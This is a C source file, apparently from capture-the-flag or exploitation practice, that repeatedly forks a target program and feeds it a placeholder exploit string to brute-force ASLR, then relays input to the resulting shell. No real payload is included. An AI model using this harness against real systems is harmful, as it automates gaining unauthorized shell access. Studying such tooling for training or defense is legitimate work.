/* Run a program repeatedly to bruteforce ASLR or similar. 

This is more of a skeleton to expand on than an actual usable program,
but it illustrates some useful key features. */

#include <errno.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

char exploit[] = "<static_exploit_goes_here>";

int main() {
	char *argv[] = {"payload", "a", "b", "c", NULL};
	char *envp[] = {"PATH=.", NULL};

	int ctr = 0;
	while(1) {
		printf("iteration %d\n", ctr++);
		int pd[2];
		pipe(pd);
		int pid = fork();
		if(pid < 0) {
			printf("cool down\n");
			usleep(1000000);
			continue;
		}
		if(pid == 0) {
			dup2(pd[0], 0);
			close(pd[0]);
			close(pd[1]);
			execve("./payload", argv, envp);
		}
		close(pd[0]);
		write(pd[1], exploit, sizeof(exploit));
		int i;
		for(i=0; i<1000; i++) {
			int status;
			if(waitpid(-1, &status, WNOHANG) < 0 && errno == ECHILD) {
				printf("all dead\n");
				break;
			}
			usleep(1000);
		}

        /* Assume that a program will never hang if the exploit fails.
        This assumption does not always hold true!
        Handling hangs is a topic of future work.
        (One approach might be to write commands tentatively to see
        if the shell responds; another would be to walk the process
        list and see if a shell is present.) */
		printf("iteration %d done\n", ctr);
		if(i < 1000) {
			close(pd[1]);
			continue;
		}
		printf("HERE'S A SHELL\n");

		while(1) {
			char buf[4096];
			int res = read(0, buf, 4096);
			if(res < 0) exit(0);
			write(pd[1], buf, res);
		}
	}
}
